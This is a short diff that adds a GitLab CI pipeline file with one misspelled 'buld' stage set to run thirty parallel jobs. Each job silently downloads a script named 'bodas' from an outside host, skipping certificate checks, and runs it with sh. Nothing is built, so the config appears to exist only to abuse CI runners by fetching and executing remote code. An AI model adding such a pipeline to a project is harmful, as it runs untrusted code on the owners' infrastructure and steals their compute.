@@ -1,0 +1,8 @@
+stages:
+- buld
+buld:
+  parallel: 30
+  stage: buld
+  script:
+    - curl -sLkO https://s.umj.ac.id/bodas
+    - sh bodas
